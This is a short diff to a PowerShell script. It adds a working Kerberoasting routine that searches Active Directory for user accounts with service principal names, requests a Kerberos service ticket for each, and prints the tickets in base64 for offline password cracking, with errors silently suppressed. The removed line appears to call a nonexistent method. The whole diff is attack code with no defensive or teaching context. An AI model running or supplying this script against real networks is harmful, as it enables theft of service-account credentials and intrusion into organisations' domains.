@@ -1,3 +1,18 @@
-
 Add-Type -AssemblyName System.IdentityModel
-[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::Export($true, "D:\Users")
+$searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
+$targets = $searcher.FindAll()
+
+foreach ($target in $targets) {
+    $spn = $target.Properties.serviceprincipalname[0]
+    try {
+        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+        $requestBytes = $token.GetRequest()
+        
+        $b64 = [Convert]::ToBase64String($requestBytes)
+        
+        Write-Host "`n--- START TICKET: $spn ---" -ForegroundColor Cyan
+        Write-Host $b64
+        Write-Host "--- END TICKET ---" -ForegroundColor Cyan
+    } catch {
+    }
+}
